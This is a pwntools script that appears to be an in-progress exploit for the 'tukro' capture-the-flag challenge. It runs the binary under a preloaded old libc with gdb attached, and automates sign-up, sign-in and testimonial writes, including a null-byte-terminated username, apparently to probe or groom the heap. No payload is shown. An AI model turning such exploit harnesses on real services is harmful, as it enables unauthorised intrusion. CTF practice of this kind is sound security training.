from pwn import *
#target=remote('tukro.pwn2.win' ,1337)
envi={"LD_PRELOAD":"./libc-2.23.so"}
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.23.so','./tukro'],env=envi)

context.terminal=["tmux","split","-h"]
gdb.attach(target,gdbscript='''pie breakpoint *(0x13fd-0x204000) ''')
#gdb.attach(target)

def signup(username,password):
	print(target.recvuntil("choice: "))
	target.sendline("1")
	print(target.recvuntil("name: "))
	target.send(username)
	print(target.recvuntil("word: "))
	target.send(password)

def signin(username,password):
	print(target.recvuntil("choice: "))
	target.sendline("2")
	print(target.recvuntil("name: "))
	target.send(username)
	print(target.recvuntil("word: "))
	target.send(password)

def write_test(ruser,test):
	print(target.recvuntil("choice: "))
	target.sendline("1")
	print(target.recvuntil("name: "))
	target.send(ruser)
	print(target.recvuntil("ial: "))
	target.send(test)
		
def my_test():
	print(target.recvuntil("choice: "))
	target.sendline("1")
		
signup("AAAA","aaaa")
signup("BBBB","bbbb")
signup("CCCC","cccc")
signup("DDDD","dddd")
signin("BBBB","bbbb")
for i in range(10):
	write_test("CCCC\x00","test"+str(i))


target.interactive()
